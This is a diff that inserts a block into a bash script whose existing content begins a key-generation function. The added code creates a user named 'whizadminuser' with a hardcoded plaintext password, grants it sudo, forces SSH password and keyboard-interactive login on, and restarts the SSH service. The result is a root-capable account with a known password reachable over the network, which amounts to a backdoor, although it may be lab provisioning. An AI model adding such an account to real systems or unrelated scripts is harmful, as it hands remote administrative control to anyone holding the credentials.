@@ -1,4 +1,34 @@
 #!/bin/bash
+
+#!/usr/bin/env bash
+set -euo pipefail
+
+U="whizadminuser"
+P="WhizAdminUser@123"
+
+id "$U" &>/dev/null || useradd -m -s /bin/bash "$U"
+printf '%s:%s\n' "$U" "$P" | chpasswd
+usermod -aG sudo "$U" || true
+passwd -u "$U" >/dev/null 2>&1 || true
+
+D=/etc/ssh/sshd_config.d
+F="$D/60-cloudimg-settings.conf"
+mkdir -p "$D"
+
+if [ -f "$F" ]; then
+  grep -qiE '^\s*PasswordAuthentication\s+' "$F" && sed -i -E 's/^\s*PasswordAuthentication\s+.*/PasswordAuthentication yes/I' "$F" || echo 'PasswordAuthentication yes' >>"$F"
+  grep -qiE '^\s*KbdInteractiveAuthentication\s+' "$F" && sed -i -E 's/^\s*KbdInteractiveAuthentication\s+.*/KbdInteractiveAuthentication yes/I' "$F" || echo 'KbdInteractiveAuthentication yes' >>"$F"
+  grep -qiE '^\s*UsePAM\s+' "$F" && sed -i -E 's/^\s*UsePAM\s+.*/UsePAM yes/I' "$F" || echo 'UsePAM yes' >>"$F"
+else
+  cat >"$D/99-whiz-password.conf" <<'EOF'
+PasswordAuthentication yes
+KbdInteractiveAuthentication yes
+UsePAM yes
+EOF
+fi
+
+systemctl restart ssh
+
 generate_key() {
   local static1=$1
   local static2=$2
